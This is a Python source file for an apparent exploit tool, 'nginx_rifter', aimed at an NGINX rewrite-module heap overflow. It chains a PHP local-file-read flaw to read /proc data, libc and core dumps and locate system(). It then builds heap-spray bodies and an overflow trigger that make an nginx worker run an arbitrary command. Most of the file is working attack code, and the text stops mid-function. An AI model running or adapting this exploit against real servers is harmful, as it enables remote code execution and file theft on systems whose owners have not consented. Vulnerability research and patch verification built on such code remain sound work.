#!/usr/bin/env python3
import argparse
import datetime as dt
import fnmatch
import hashlib
import json
import os
import re
import shlex
import socket
import secrets
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import PurePosixPath


TOOL_VERSION = "v2.1"
BUG_CVE = "CVE-2026-42945"
BUG_NAME = "NGINX rewrite-module heap buffer overflow"
BUG_DETAIL = "rewrite/set args-escaping length/copy mismatch"
FIXED_UPSTREAM = "NGINX OSS 1.30.1 / 1.31.0; NGINX Plus R36 P4 / R35 P2 / R32 P6"
DEFAULT_TARGET = "127.0.0.1:19321"
DEFAULT_CONFIG_PATHS = (
    "/etc/nginx/nginx.conf",
    "/usr/local/nginx/conf/nginx.conf",
    "/app/nginx-lfi.conf",
    "/app/nginx.conf",
)
DEFAULT_PID_FILES = (
    "/app/tmp/nginx.pid",
    "/run/nginx.pid",
    "/var/run/nginx.pid",
)
DEFAULT_PROBE_CRASH_ADDR = 0x303030303030
BODY_LEN = 4000
N_SPRAY = 20
DEFAULT_A_COUNT = 127
DEFAULT_PLUS_COUNT = 962
H2_PREFACE = (
    b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    b"\x00\x00\x00"
    b"\x04"
    b"\x00"
    b"\x00\x00\x00\x00"
)
H2_EXTENSION_FRAME = 0x0B
URI_SAFE_BYTES = set()
_NGX_UNSAFE_TABLE = [
    0xFFFFFFFF,
    0xD800086D,
    0x50000000,
    0xB8000001,
    0xFFFFFFFF,
    0xFFFFFFFF,
    0xFFFFFFFF,
    0xFFFFFFFF,
]
for _byte in range(256):
    if not (_NGX_UNSAFE_TABLE[_byte >> 5] & (1 << (_byte & 0x1F))):
        URI_SAFE_BYTES.add(_byte)


class Palette:
    def __init__(self, enabled=True):
        self.enabled = enabled and "NO_COLOR" not in os.environ

    def paint(self, text, code):
        if not self.enabled:
            return str(text)
        return f"\033[{code}m{text}\033[0m"

    def bold(self, text):
        return self.paint(text, "1")

    def cyan(self, text):
        return self.paint(text, "36")

    def green(self, text):
        return self.paint(text, "32")

    def yellow(self, text):
        return self.paint(text, "33")

    def red(self, text):
        return self.paint(text, "31")

    def magenta(self, text):
        return self.paint(text, "35")

    def dim(self, text):
        return self.paint(text, "2")


class Reporter:
    def __init__(self, color=True, verbose=False):
        self.c = Palette(color)
        self.verbose = verbose
        self.step_no = 0

    def line(self, text=""):
        print(text, flush=True)

    def banner(self, target, vector):
        self.line()
        self.line(self.c.bold(self.c.cyan(f"nginx_rifter {TOOL_VERSION} - NGINX Rift assessor")))
        self.line(self.c.dim("=" * 78))
        self.line(f"Bug:      {self.c.bold(BUG_CVE)} - {BUG_NAME}")
        self.line(f"Cause:    {BUG_DETAIL}")
        self.line(f"Target:   {self.c.bold(target)}")
        self.line(f"FileRead: {vector}")
        self.line("Default:  assessment only; pass --exploit --cmd ... for the crashing exploit path")
        self.line(f"Fixed:    {FIXED_UPSTREAM}")
        self.line(self.c.dim("=" * 78))
        self.line()

    def step(self, title):
        self.step_no += 1
        self.line()
        self.line(self.c.bold(self.c.cyan(f"[{self.step_no:02d}] {title}")))
        self.line(self.c.dim("-" * 78))

    def kv(self, key, value, status=None):
        rendered = str(value)
        if status == "ok":
            rendered = self.c.green(rendered)
        elif status == "warn":
            rendered = self.c.yellow(rendered)
        elif status == "bad":
            rendered = self.c.red(rendered)
        self.line(f"    {self.c.dim((key + ':').ljust(30))} {rendered}")

    def ok(self, text):
        self.line(f"{self.c.green('[+]')} {text}")

    def warn(self, text):
        self.line(f"{self.c.yellow('[!]')} {text}")

    def fail(self, text):
        self.line(f"{self.c.red('[-]')} {text}")

    def info(self, text):
        if self.verbose:
            self.line(f"{self.c.cyan('[*]')} {text}")


@dataclass
class ReadAttempt:
    path: str
    ok: bool
    bytes_read: int = 0
    sample: str = ""
    error: str = ""


@dataclass
class ConfigCandidate:
    source: str
    line: int
    location: str
    rewrite: str
    set_directive: str
    reason: str
    confidence: str


@dataclass
class Assessment:
    target: dict
    started_at: str
    http: dict = field(default_factory=dict)
    file_read: dict = field(default_factory=dict)
    os: dict = field(default_factory=dict)
    proc: dict = field(default_factory=dict)
    worker: dict = field(default_factory=dict)
    binaries: dict = field(default_factory=dict)
    nginx_config: dict = field(default_factory=dict)
    viability: dict = field(default_factory=dict)
    exploit: dict = field(default_factory=dict)
    completed_at: str = ""


@dataclass
class Mapping:
    start: int
    end: int
    perms: str
    offset: int
    path: str


@dataclass
class TargetFacts:
    worker_pid: int
    worker_uid: int
    nginx_rw_base: int
    nginx_path: str
    libc_base: int
    libc_path: str
    heap_ranges: list


@dataclass
class CoreSlotHit:
    addr: int
    slot_offset: int


@dataclass
class CoreSlotHits:
    safe: list
    unsafe: list


@dataclass
class CorePoolHit:
    addr: int
    last: int
    end: int
    cleanup: int


@dataclass
class CoreSlotMatch:
    hit: CoreSlotHit
    pool: CorePoolHit


class HttpFileReadTarget:
    def __init__(
        self,
        host,
        port,
        *,
        scheme="http",
        endpoint="/lfi.php",
        file_param="file",
        offset_param="offset",
        length_param="length",
        template=None,
        phpinfo_path="/phpinfo.php",
        timeout=5,
    ):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.endpoint = endpoint
        self.file_param = file_param
        self.offset_param = offset_param
        self.length_param = length_param
        self.template = template
        self.phpinfo_path = phpinfo_path
        self.timeout = timeout
        self.base_url = f"{scheme}://{host}:{port}"

    def describe(self):
        if self.template:
            return {
                "type": "template",
                "template": self.template,
                "phpinfo_path": self.phpinfo_path,
            }
        return {
            "type": "query-params",
            "endpoint": self.endpoint,
            "file_param": self.file_param,
            "offset_param": self.offset_param,
            "length_param": self.length_param,
            "phpinfo_path": self.phpinfo_path,
        }

    def vector_label(self):
        if self.template:
            return ellipsize(self.template, 72)
        return f"{self.endpoint}?{self.file_param}=<path>"

    def get(self, path_or_url, timeout=None):
        if path_or_url.startswith(("http://", "https://")):
            url = path_or_url
        else:
            url = self.base_url + path_or_url
        with urllib.request.urlopen(url, timeout=timeout or self.timeout) as resp:
            return resp.read()

    def lfi_read(self, filename, timeout=None, offset=None, length=None):
        if self.template:
            return self.get(self._render_template(filename, offset, length), timeout=timeout)
        params = {self.file_param: filename}
        if offset is not None and self.offset_param:
            params[self.offset_param] = str(offset)
        if length is not None and self.length_param:
            params[self.length_param] = str(length)
        separator = "&" if "?" in self.endpoint else "?"
        return self.get(f"{self.endpoint}{separator}{urllib.parse.urlencode(params)}", timeout=timeout)

    def _render_template(self, filename, offset, length):
        path_url = urllib.parse.quote(filename, safe="")
        range_params = []
        if offset is not None and self.offset_param:
            range_params.append((self.offset_param, str(offset)))
        if length is not None and self.length_param:
            range_params.append((self.length_param, str(length)))
        range_query = f"&{urllib.parse.urlencode(range_params)}" if range_params else ""
        values = {
            "scheme": self.scheme,
            "host": self.host,
            "port": self.port,
            "base_url": self.base_url,
            "path": filename,
            "path_url": path_url,
            "path_plus": urllib.parse.quote_plus(filename),
            "file": filename,
            "file_url": path_url,
            "offset": "" if offset is None else str(offset),
            "length": "" if length is None else str(length),
            "range_query": range_query,
        }
        try:
            rendered = self.template.format(**values)
        except KeyError as exc:
            raise RuntimeError(f"unknown --file-read-template placeholder: {exc}") from exc
        if rendered.startswith(("http://", "https://")):
            return rendered
        return self.base_url + rendered

    def lfi_text(self, filename, timeout=None):
        return self.lfi_read(filename, timeout=timeout).decode("latin-1", errors="replace")

    def phpinfo(self):
        if not self.phpinfo_path:
            return ""
        try:
            return self.get(self.phpinfo_path, timeout=self.timeout).decode("latin-1", errors="replace")
        except (urllib.error.URLError, TimeoutError, OSError):
            return ""


class RifterTarget(HttpFileReadTarget):
    def __init__(self, *args, headers=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.headers = headers or {}

    def get(self, path_or_url, timeout=None):
        if path_or_url.startswith(("http://", "https://")):
            url = path_or_url
        else:
            url = self.base_url + path_or_url
        request = urllib.request.Request(url, headers=self.headers)
        with urllib.request.urlopen(request, timeout=timeout or self.timeout) as resp:
            return resp.read()

    def open_response(self, path="/", timeout=None):
        request = urllib.request.Request(self.base_url + path, headers=self.headers)
        return urllib.request.urlopen(request, timeout=timeout or self.timeout)


def now():
    return dt.datetime.now(dt.UTC).isoformat(timespec="seconds")


def ellipsize(text, max_len=118):
    rendered = "" if text is None else str(text)
    if len(rendered) <= max_len:
        return rendered
    return rendered[: max_len - 3] + "..."


def parse_host_port(value):
    raw = value.strip()
    if raw.startswith("["):
        end = raw.find("]")
        if end == -1:
            raise argparse.ArgumentTypeError("invalid IPv6 host syntax")
        host = raw[1:end]
        rest = raw[end + 1 :]
        if rest.startswith(":"):
            return host, int(rest[1:])
        if rest:
            raise argparse.ArgumentTypeError("invalid host:port syntax")
        return host, None
    if raw.count(":") == 1:
        host, port_s = raw.rsplit(":", 1)
        if port_s.isdigit():
            return host, int(port_s)
    return raw, None


def parse_key_value_text(text):
    values = {}
    for line in text.splitlines():
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key] = value.strip().strip('"')
    return values


def parse_headers(values):
    headers = {}
    for value in values or []:
        if ":" not in value:
            raise argparse.ArgumentTypeError("headers must be in 'Name: value' form")
        name, header_value = value.split(":", 1)
        headers[name.strip()] = header_value.strip()
    return headers


def parse_target(value, fallback_port):
    host, embedded_port = parse_host_port(value)
    return host, embedded_port or fallback_port


def status_for_bool(value):
    if value is True:
        return "ok"
    if value is False:
        return "bad"
    return "warn"


def short_error(exc):
    if isinstance(exc, urllib.error.HTTPError):
        return f"HTTP {exc.code}"
    return str(exc)


def parse_addr(value):
    return int(value, 0)


def read_int_prefix(data):
    match = re.search(rb"\b(\d+)\b", data)
    return int(match.group(1)) if match else None


def parse_status_uid(status_text):
    match = re.search(r"^Uid:\s+(\d+)\s+", status_text, re.MULTILINE)
    return int(match.group(1)) if match else None


def parse_maps(maps_text):
    mappings = []
    for line in maps_text.splitlines():
        fields = line.split(None, 5)
        if len(fields) < 5:
            continue
        start_s, end_s = fields[0].split("-", 1)
        mappings.append(
            Mapping(
                start=int(start_s, 16),
                end=int(end_s, 16),
                perms=fields[1],
                offset=int(fields[2], 16),
                path=fields[5] if len(fields) == 6 else "",
            )
        )
    return mappings


def parse_facts(worker_pid, worker_uid, maps_text):
    nginx_rw = None
    nginx_path = ""
    libc_base = None
    libc_path = ""
    heap_ranges = []
    for mapping in parse_maps(maps_text):
        if mapping.path == "[heap]":
            heap_ranges.append((mapping.start, mapping.end))
        if mapping.path.endswith("/nginx") or "/nginx-src/build/nginx" in mapping.path:
            nginx_path = mapping.path
            if mapping.perms.startswith("rw") and nginx_rw is None:
                nginx_rw = mapping.start
        if "libc.so.6" in mapping.path or re.search(r"/libc-\d", mapping.path):
            if mapping.offset == 0 and libc_base is None:
                libc_base = mapping.start
                libc_path = mapping.path
    if nginx_rw is None:
        raise RuntimeError("could not find nginx writable image mapping in worker maps")
    if libc_base is None or not libc_path:
        raise RuntimeError("could not find libc base/path in worker maps")
    return TargetFacts(
        worker_pid=worker_pid,
        worker_uid=worker_uid,
        nginx_rw_base=nginx_rw,
        nginx_path=nginx_path,
        libc_base=libc_base,
        libc_path=libc_path,
        heap_ranges=heap_ranges,
    )


def children_from_pidfile(target, pid_files):
    for pid_file in pid_files:
        pid_raw = target.lfi_read(pid_file, timeout=2)
        master_pid = read_int_prefix(pid_raw)
        if master_pid is None:
            continue
        children_raw = target.lfi_read(
            f"/proc/{master_pid}/task/{master_pid}/children", timeout=2
        )
        children = [
            int(pid)
            for pid in children_raw.decode("ascii", errors="ignore").split()
            if pid.isdigit()
        ]
        if children:
            return master_pid, children
    return None, []


def pid_status(target, pid):
    status = target.lfi_text(f"/proc/{pid}/status", timeout=2)
    if not status or "Name:" not in status:
        return "", None
    return status, parse_status_uid(status)


def is_nginx_worker_status(status, uid, php_uid):
    name_ok = "Name:\tnginx" in status or "Name: nginx" in status
    return name_ok and uid is not None and uid == php_uid


def find_worker(target, max_pid, pid_files):
    php_status = target.lfi_text("/proc/self/status", timeout=2)
    php_uid = parse_status_uid(php_status)
    if php_uid is None:
        raise RuntimeError("could not determine PHP-FPM worker UID from /proc/self/status")

    master_pid, child_pids = children_from_pidfile(target, pid_files)
    candidate_pids = child_pids + [pid for pid in range(1, max_pid + 1) if pid not in child_pids]
    for pid in candidate_pids:
        status, uid = pid_status(target, pid)
        if not is_nginx_worker_status(status, uid, php_uid):
            continue
        maps = target.lfi_text(f"/proc/{pid}/maps", timeout=2)
        if "/nginx-src/build/nginx" not in maps and "/nginx" not in maps:
            continue
        if "libc.so.6" not in maps:
            continue
        return parse_facts(pid, uid, maps), php_uid, master_pid
    raise RuntimeError(
        f"could not find a same-UID nginx worker with readable maps in /proc/1..{max_pid}"
    )


def cstring(data, offset):
    end = data.find(b"\x00", offset)
    return data[offset:] if end == -1 else data[offset:end]


def find_elf_dynsym(data, symbol_name):
    if data[:4] != b"\x7fELF":
        raise RuntimeError("LFI-read libc is not an ELF file")
    if data[4] != 2 or data[5] != 1:
        raise RuntimeError("only little-endian ELF64 is supported")
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    if e_shoff == 0 or e_shnum == 0:
        raise RuntimeError("ELF section headers are unavailable")
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh = struct.unpack_from("<IIQQQQIIQQ", data, off)
        sections.append(
            {
                "name_off": sh[0],
                "type": sh[1],
                "offset": sh[4],
                "size": sh[5],
                "link": sh[6],
                "entsize": sh[9],
            }
        )
    if e_shstrndx >= len(sections):
        raise RuntimeError("ELF section-name string table index is invalid")
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr["offset"] : shstr["offset"] + shstr["size"]]
    for section in sections:
        section["name"] = cstring(shstr_data, section["name_off"]).decode("ascii", errors="replace")

    wanted = symbol_name.encode("ascii")
    for section in sections:
        if section["type"] != 11 or section["link"] >= len(sections):
            continue
        strtab = sections[section["link"]]
        strings = data[strtab["offset"] : strtab["offset"] + strtab["size"]]
        entsize = section["entsize"] or 24
        if entsize < 24:
            continue
        symtab = data[section["offset"] : section["offset"] + section["size"]]
        for off in range(0, len(symtab) - entsize + 1, entsize):
            st_name, _st_info, _st_other, _st_shndx, st_value, _st_size = struct.unpack_from(
                "<IBBHQQ", symtab, off
            )
            if cstring(strings, st_name) == wanted:
                return st_value
    raise RuntimeError(f"could not find dynamic symbol {symbol_name!r} in libc")


def derive_system(target, libc_path, libc_base):
    libc = target.lfi_read(libc_path, timeout=10)
    system_offset = find_elf_dynsym(libc, "system")
    return system_offset, libc_base + system_offset


def addr_low_is_safe(addr, nbytes):
    return all(((addr >> (j * 8)) & 0xFF) in URI_SAFE_BYTES for j in range(nbytes))


def low_bytes(addr, nbytes):
    return bytes((addr >> (j * 8)) & 0xFF for j in range(nbytes))


def make_body_at_offset(cmd, fake_addr, system_addr, offset):
    if offset < 0 or offset % 8:
        raise RuntimeError(f"fake cleanup offset must be non-negative and 8-byte aligned: {offset}")
    cmd_bytes = cmd.encode("utf-8") + b"\x00"
    payload_len = offset + 24 + len(cmd_bytes)
    if payload_len > BODY_LEN:
        raise RuntimeError(f"command too long for body offset {offset}: {payload_len} > {BODY_LEN}")
    body = bytearray(b"A" * BODY_LEN)
    struct.pack_into("<QQQ", body, offset, system_addr, fake_addr + 24, 0)
    body[offset + 24 : offset + 24 + len(cmd_bytes)] = cmd_bytes
    return bytes(body)


def make_slot_probe_body(nonce, marker_offset=24, stride=8):
    if len(nonce) != 6:
        raise RuntimeError("slot probe nonce must be exactly 6 bytes")
    if marker_offset < 2 or stride < 8 or stride % 8:
        raise RuntimeError("invalid slot probe geometry")
    marker_len = 8
    body = bytearray(b"A" * BODY_LEN)
    max_slot = BODY_LEN - marker_offset - marker_len
    for off in range(0, max_slot + 1, stride):
        struct.pack_into("<H", body, off + marker_offset, off)
        body[off + marker_offset + 2 : off + marker_offset + marker_len] = nonce
    return bytes(body)


def make_h2_frame(frame_type, payload, flags=0, stream_id=0):
    if len(payload) > 0xFFFFFF:
        raise RuntimeError(f"HTTP/2 frame payload too large: {len(payload)}")
    return (
        len(payload).to_bytes(3, "big")
        + bytes([frame_type, flags])
        + (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
        + payload
    )


def wait_alive(host, port, timeout=30):
    for _ in range(timeout):
        try:
            with socket.create_connection((host, port), timeout=2) as sock:
                sock.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
                sock.recv(100)
            return True
        except Exception:
            time.sleep(1)
    return False


def attempt(
    host,
    port,
    target_bytes,
    body,
    *,
    h2_victim=True,
    victim_body_len=65536,
    a_count=DEFAULT_A_COUNT,
    plus_count=DEFAULT_PLUS_COUNT,
):
    sprays = []
    for _ in range(N_SPRAY):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            req = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: l\r\n"
                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                + body
            )
            sock.sendall(req)
            sprays.append(sock)
        except Exception:
            break
        time.sleep(0.005)
    time.sleep(0.2)

    try:
        trigger = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
    except Exception:
        for sock in sprays:
            sock.close()
        return False

    payload = "A" * a_count + "+" * plus_count + target_bytes.decode("latin-1")
    trigger.sendall((f"GET /api/{payload} HTTP/1.1\r\nHost:localhost\r\n").encode("latin-1"))
    time.sleep(0.05)

    try:
        victim = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
    except Exception:
        for sock in sprays:
            sock.close()
        trigger.close()
        return False

    if h2_victim:
        victim.sendall(H2_PREFACE + make_h2_frame(H2_EXTENSION_FRAME, body))
        victim.settimeout(0.2)
        try:
            victim.recv(128)
        except (socket.timeout, ConnectionResetError, OSError):
            pass
    else:
        victim_body = b"V" * victim_body_len
        victim.sendall(
            b"POST /victim_upload HTTP/1.1\r\n"
            b"Host:localhost\r\n"
            b"X-Delay:60\r\n"
            b"Content-Length: " + str(len(victim_body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n"
            + victim_body
        )
    time.sleep(0.05)

    trigger.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    time.sleep(0.2)
    crashed = False
    try:
        trigger.settimeout(0.5)
        data = trigger.recv(1024)
        crashed = data == b""
    except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
        crashed = True

    for sock in sprays + [trigger, victim]:
        try:
            sock.close()
        except Exception:
            pass
    return crashed


def lfi_read_prefix(target, path, max_bytes, chunk_size=1024 * 1024):
    chunks = []
    total = 0
    while total < max_bytes:
        read_len = min(chunk_size, max_bytes - total)
        chunk = target.lfi_read(path, offset=total, length=read_len, timeout=20)
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
        if len(chunk) < read_len:
            break
    return b"".join(chunks)


def lfi_hash_file(target, path, max_bytes, chunk_size=1024 * 1024):
    digest = hashlib.sha256()
    total = 0
    while total < max_bytes:
        read_len = min(chunk_size, max_bytes - total)
        chunk = target.lfi_read(path, offset=total, length=read_len, timeout=20)
        if not chunk:
            break
        digest.update(chunk)
        total += len(chunk)
        if len(chunk) < read_len:
            break
    return {"sha256": digest.hexdigest(), "bytes_read": total}


def extract_version_strings(binary):
    text = binary.decode("latin-1", errors="ignore")
    versions = sorted(set(re.findall(r"(?:nginx|OpenSSL|GLIBC|GNU C Library)[^\x00\n\r]{0,80}", text)))
    return versions[:30]


def dpkg_package_version(status_text, package):
    current = None
    for line in status_text.splitlines():
        if line.startswith("Package: "):
            current = line.split(":", 1)[1].strip()
        elif current == package and line.startswith("Version: "):
            return line.split(":", 1)[1].strip()
    return ""


def parse_elf_build_id_from_notes(data):
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        return ""
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        if off + 56 > len(data):
            break
        p_type, _p_flags, p_offset, _p_vaddr, _p_paddr, p_filesz, _p_memsz, _p_align = (
            struct.unpack_from("<IIQQQQQQ", data, off)
        )
        if p_type != 4:
            continue
        note_end = min(len(data), p_offset + p_filesz)
        pos = p_offset
        while pos + 12 <= note_end:
            namesz, descsz, note_type = struct.unpack_from("<III", data, pos)
            pos += 12
            name = data[pos : pos + namesz].rstrip(b"\x00")
            pos = (pos + namesz + 3) & ~3
            desc = data[pos : pos + descsz]
            pos = (pos + descsz + 3) & ~3
            if name == b"GNU" and note_type == 3:
                return desc.hex()
    return ""


def elf_build_id(target, path):
    return parse_elf_build_id_from_notes(lfi_read_prefix(target, path, 2 * 1024 * 1024))


def parse_core_loads(target, core_path):
    header = target.lfi_read(core_path, offset=0, length=0x1000, timeout=10)
    if header[:4] != b"\x7fELF":
        raise RuntimeError(f"{core_path} is not an ELF core file")
    if header[4] != 2 or header[5] != 1:
        raise RuntimeError("only little-endian ELF64 core files are supported")
    e_phoff = struct.unpack_from("<Q", header, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", header, 0x36)[0]
    e_phnum = struct.unpack_from("<H", header, 0x38)[0]
    if e_phoff == 0 or e_phentsize == 0 or e_phnum == 0:
        raise RuntimeError("core file has no usable program headers")
    phdr_data = target.lfi_read(
        core_path, offset=e_phoff, length=e_phentsize * e_phnum, timeout=10
    )
    loads = []
    for i in range(e_phnum):
        off = i * e_phentsize
        if off + 56 > len(phdr_data):
            break
        p_type, p_flags, p_offset, p_vaddr, _p_paddr, p_filesz, p_memsz, _p_align = (
            struct.unpack_from("<IIQQQQQQ", phdr_data, off)
        )
        if p_type == 1 and p_filesz:
            loads.append(
                {
                    "flags": p_flags,
                    "offset": p_offset,
                    "vaddr": p_vaddr,
                    "filesz": p_filesz,
                    "memsz": p_memsz,
                }
            )
    return loads


def core_addr_is_mapped(loads, addr, size=1, writable=None):
    for load in loads:
        if writable is not None and bool(load["flags"] & 2) != writable:
            continue
        if load["vaddr"] <= addr and addr + size <= load["vaddr"] + load["filesz"]:
            return True
    return False


def looks_like_pool(words, base):
    if len(words) < 10:
        return False
    last, end, next_pool, _failed, max_size, current, _chain, _large, cleanup, log = words[:10]
    if not (base < last <= end):
        return False
    if not (0 < end - base <= 0x40000):
        return False
    if next_pool and not (base - 0x1000000 <= next_pool <= base + 0x1000000):
        return False
    if current and not (base <= current <= end):
        return False
    if cleanup and not (base - 0x1000000 <= cleanup <= base + 0x1000000):
        return False
    if not log or max_size > 0x100000:
        return False
    return True


def search_core_for_cleanup_pools(target, core_path, max_hits=5000):
    loads = parse_core_loads(target, core_path)
    hits = []
    seen = set()
    for load in loads:
        if not (load["flags"] & 2):
            continue
        pos = 0
        carry = b""
        while pos < load["filesz"]:
            read_len = min(1024 * 1024, load["filesz"] - pos)
            chunk = target.lfi_read(core_path, offset=load["offset"] + pos, length=read_len, timeout=20)
            if not chunk:
                break
            buf = carry + chunk
            buf_vaddr = load["vaddr"] + pos - len(carry)
            idx = ((buf_vaddr + 7) & ~0x7) - buf_vaddr
            while idx + 80 <= len(buf):
                pool_addr = buf_vaddr + idx
                if pool_addr not in seen:
                    words = [struct.unpack_from("<Q", buf, idx + off)[0] for off in range(0, 80, 8)]
                    if looks_like_pool(words, pool_addr) and words[8]:
                        if core_addr_is_mapped(loads, words[8], 24, writable=True):
                            seen.add(pool_addr)
                            hits.append(CorePoolHit(pool_addr, words[0], words[1], words[8]))
                            if len(hits) >= max_hits:
                                return hits
                idx += 8
            carry = buf[-96:]
            pos += len(chunk)
    return hits


def search_core_for_probe_cleanup_pools(target, core_path, probe_addr, target_len, max_hits=5000):
    loads = parse_core_loads(target, core_path)
    mask = (1 << (8 * target_len)) - 1
    probe_low = probe_addr & mask
    hits = []
    seen = set()
    for load in loads:
        if not (load["flags"] & 2):
            continue
        pos = 0
        carry = b""
        while pos < load["filesz"]:
            read_len = min(1024 * 1024, load["filesz"] - pos)
            chunk = target.lfi_read(core_path, offset=load["offset"] + pos, length=read_len, timeout=20)
            if not chunk:
                break
            buf = carry + chunk
            buf_vaddr = load["vaddr"] + pos - len(carry)
            idx = ((buf_vaddr + 15) & ~0xF) - buf_vaddr
            while idx + 80 <= len(buf):
                pool_addr = buf_vaddr + idx
                if pool_addr in seen:
                    idx += 16
                    continue
                cleanup = struct.unpack_from("<Q", buf, idx + 64)[0]
                log = struct.unpack_from("<Q", buf, idx + 72)[0]
                if (
                    cleanup
                    and (cleanup & mask) == probe_low
                    and core_addr_is_mapped(loads, cleanup, 24, writable=True)
                    and core_addr_is_mapped(loads, log, 16, writable=True)
                    and pool_addr - 0x1000000 <= cleanup <= pool_addr + 0x1000000
                ):
                    seen.add(pool_addr)
                    words = [struct.unpack_from("<Q", buf, idx + off)[0] for off in range(0, 80, 8)]
                    hits.append(CorePoolHit(pool_addr, words[0], words[1], cleanup))
                    if len(hits) >= max_hits:
                        return hits
                idx += 16
            carry = buf[-96:]
            pos += len(chunk)
    return hits


def search_core_for_slot_markers(
    target,
    core_path,
    nonce,
    marker_offset,
    stride,
    target_len=2,
    max_hits=20000,
):
    loads = parse_core_loads(target, core_path)
    overlap = max(64, len(nonce) + marker_offset + 16)
    hits = []
    seen = set()
    max_slot = BODY_LEN - marker_offset - 8
    for load in loads:
        if not (load["flags"] & 2):
            continue
        pos = 0
        carry = b""
        while pos < load["filesz"]:
            read_len = min(1024 * 1024, load["filesz"] - pos)
            chunk = target.lfi_read(core_path, offset=load["offset"] + pos, length=read_len, timeout=20)
            if not chunk:
                break
            buf = carry + chunk
            buf_vaddr = load["vaddr"] + pos - len(carry)
            search_from = 0
            while True:
                idx = buf.find(nonce, search_from)
                if idx == -1:
                    break
                if idx >= 2:
                    marker_start = buf_vaddr + idx - 2
                    slot_offset = struct.unpack_from("<H", buf, idx - 2)[0]
                    if slot_offset <= max_slot and slot_offset % stride == 0 and marker_start >= marker_offset:
                        fake_addr = marker_start - marker_offset
                        key = (fake_addr, slot_offset)
                        if key not in seen:
                            seen.add(key)
                            hits.append(CoreSlotHit(fake_addr, slot_offset))
                            if len(hits) >= max_hits:
                                break
                search_from = idx + 1
            if len(hits) >= max_hits:
                break
            carry = buf[-overlap:]
            pos += len(chunk)
        if len(hits) >= max_hits:
            break
    safe, unsafe = [], []
    for hit in hits:
        (safe if addr_low_is_safe(hit.addr, target_len) else unsafe).append(hit)
    return CoreSlotHits(safe=safe, unsafe=unsafe)


def filter_slot_hits_by_cleanup_windows(slot_hits, pools, target_len):
    mask = (1 << (8 * target_len)) - 1
    matches = []
    seen = set()
    for hit in slot_hits:
        hit_window = hit.addr & ~mask
        for pool in pools:
            if hit_window != (pool.cleanup & ~mask):
                continue
            key = (hit.addr, hit.slot_offset)
            if key in seen:
                continue
            seen.add(key)
            matches.append(CoreSlotMatch(hit=hit, pool=pool))
            break
    return matches


def proof_seen(target, marker_path, token):
    try:
        return token.encode("ascii") in target.lfi_read(marker_path, timeout=2)
    except Exception:
        return False


def read_marker_text(target, marker_path, timeout=3):
    try:
        return target.lfi_text(marker_path, timeout=timeout)
    except Exception:
        return None


def marker_output_without_metadata(marker_text, token):
    if marker_text is None:
        return ""
    lines = []
    for line in marker_text.splitlines():
        if line == token:
            continue
        if line.startswith("__NGINX_RIFT_TOKEN__=") or line.startswith("__NGINX_RIFT_RC__="):
            continue
        lines.append(line)
    return "\n".join(lines).strip()


def try_read(target, path, timeout=3, offset=None, length=None):
    try:
        data = target.lfi_read(path, timeout=timeout, offset=offset, length=length)
        sample = data[:120].decode("latin-1", errors="replace").replace("\n", "\\n")
        return ReadAttempt(path=path, ok=True, bytes_read=len(data), sample=sample)
    except Exception as exc:
        return ReadAttempt(path=path, ok=False, error=short_error(exc))


def h2_cleartext_probe(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(H2_PREFACE)
            sock.settimeout(timeout)
            data = sock.recv(64)
        return {"tested": True, "ok": len(data) >= 9, "bytes": len(data)}
    except Exception as exc:
        return {"tested": True, "ok": False, "bytes": 0, "error": str(exc)}


def http_fingerprint(target, args):
    result = {"url": target.base_url, "headers": {}, "ok": False}
    try:
        with target.open_response("/", timeout=args.timeout) as response:
            body = response.read(512)
            result.update(
                {
                    "ok": True,
                    "status": response.status,
                    "reason": response.reason,
                    "headers": dict(response.headers.items()),
                    "body_sample": body.decode("latin-1", errors="replace"),
                }
            )
    except Exception as exc:
        result["error"] = short_error(exc)
    if args.scheme == "http":
        result["http2_cleartext"] = h2_cleartext_probe(target.host, target.port, args.timeout)
    else:
        result["http2_cleartext"] = {"tested": False, "reason": "cleartext h2 probe skipped for https"}
    return result


def profile_file_read(target, args):
    reads = {
        "os_release": try_read(target, "/etc/os-release", args.timeout),
        "proc_self_status": try_read(target, "/proc/self/status", args.timeout),
        "proc_self_maps": try_read(target, "/proc/self/maps", args.timeout),
        "aslr": try_read(target, "/proc/sys/kernel/randomize_va_space", args.timeout),
        "core_pattern": try_read(target, "/proc/sys/kernel/core_pattern", args.timeout),
        "suid_dumpable": try_read(target, "/proc/sys/fs/suid_dumpable", args.timeout),
        "kernel": try_read(target, "/proc/version", args.timeout),
    }
    binary_probe = try_read(target, "/bin/sh", args.timeout, offset=0, length=4)
    range_probe = {"ok": None, "reason": "not tested"}
    if reads["os_release"].ok:
        try:
            full = target.lfi_read("/etc/os-release", timeout=args.timeout)
